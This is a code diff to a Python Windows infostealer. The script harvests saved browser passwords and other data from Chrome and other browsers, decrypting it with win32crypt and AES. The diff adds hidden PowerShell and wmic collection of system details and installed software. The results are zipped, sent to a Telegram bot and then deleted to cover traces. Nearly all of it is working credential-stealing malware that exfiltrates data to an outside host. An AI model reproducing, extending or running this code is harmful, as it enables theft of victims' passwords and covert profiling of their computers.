@@ -1,13 +1,17 @@
 import os
+import shutil
 import sqlite3
 import json
 import base64
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
-import zipfile
 import requests
 import socket
+import platform
+import subprocess
+import zipfile
+import importlib.util
+import sys
 
 bot_token = 'ID-TOKEN'
 chat_id = 'ID-CHAT'
@@ -20,7 +24,7 @@ def check_internet_connection():
         return False
 
 def get_encryption_key(browser_name):
-    if browser_name == 'Mozilla/Firefox':
+    if browser_name in ['Mozilla/Firefox', 'Safari']:
         return None
     local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Local State')
     if not os.path.exists(local_state_path):
@@ -155,11 +159,58 @@ def get_firefox_data(data_type):
 
         return data
 
+def get_computer_model():
+    try:
+        model = platform.uname().machine
+        if not model:
+            model = 'Unknown_Model'
+        return model
+    except Exception as e:
+        print(f"Error retrieving computer model: {e}")
+        return 'Unknown_Model'
+
+def collect_apps_info():
+    apps_info_file = os.path.join(os.getenv('TEMP'), 'apps_info.txt')
+    try:
+        process = subprocess.Popen(
+            ['powershell', '-ExecutionPolicy', 'ByPass', '-Command', 
+             f'Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Format-Table -AutoSize | Out-File -FilePath {apps_info_file}'],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        stdout, stderr = process.communicate()
+        if process.returncode != 0:
+            print(f"Error collecting apps info: {stderr.decode()}")
+    except Exception as e:
+        print(f"Error: {e}")
+    return apps_info_file
+
+def collect_system_info():
+    temp_info_file = os.path.join(os.getenv('TEMP'), 'system_info.txt')
+    try:
+        with open(temp_info_file, 'w') as file:
+            file.write('System Information:\n')
+            commands = [
+                'wmic computersystem get model',
+                'wmic cpu get caption',
+                'wmic memorychip get capacity',
+                'wmic logicaldisk get size,caption',
+                'systeminfo'
+            ]
+            for cmd in commands:
+                result = subprocess.check_output(cmd, shell=True).decode()
+                file.write(result)
+    except Exception as e:
+        print(f"Error collecting system info: {e}")
+    return temp_info_file
+
 def main():
     if not check_internet_connection():
         print("No internet connection detected. Exiting...")
         return
     
+    # List of popular browsers
     browsers = [
         'Google/Chrome',
         'CocCoc/Browser',
@@ -174,7 +225,9 @@ def main():
     ]
 
     base_folder = 'Browser_Data'
+    os.makedirs(base_folder, exist_ok=True)
 
+    # Collect browser data
     for browser in browsers:
         try:
             passwords = get_browser_data(browser, 'passwords')
@@ -188,8 +241,19 @@ def main():
         except FileNotFoundError as e:
             print(e)
 
-    zip_filename = 'Browser_Data.zip'
+    # Collect system and application info
+    system_info_file = collect_system_info()
+    apps_info_file = collect_apps_info()
+
+    # Create the zip file
+    computer_model = get_computer_model()
+    zip_filename = f"{computer_model}_BrowserData"
     zip_folder(base_folder, zip_filename)
+
+    # Add additional files to the zip
+    with zipfile.ZipFile(f"{zip_filename}.zip", 'a') as zipf:
+        zipf.write(system_info_file, os.path.basename(system_info_file))
+        zipf.write(apps_info_file, os.path.basename(apps_info_file))
 
     if send_file_via_telegram(bot_token, chat_id, f"{zip_filename}.zip"):
         print(f"File {zip_filename}.zip sent successfully.")
@@ -198,6 +262,8 @@ def main():
 
     shutil.rmtree(base_folder)
     os.remove(f"{zip_filename}.zip")
+    os.remove(system_info_file)
+    os.remove(apps_info_file)
 
 if __name__ == "__main__":
     main()
